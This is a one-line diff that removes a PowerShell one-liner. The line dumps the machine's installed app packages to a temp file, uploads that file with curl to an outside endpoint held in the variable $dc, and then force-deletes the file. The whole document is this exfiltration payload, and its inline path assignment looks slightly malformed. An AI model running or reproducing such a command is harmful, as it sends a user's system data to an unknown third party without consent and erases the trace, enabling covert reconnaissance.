@@ -1,1 +1,0 @@
-Get-AppxPackage|Out-File $path="$env:TEMP\a.txt";curl -F "file1=@$path" $dc;rm $path -Force
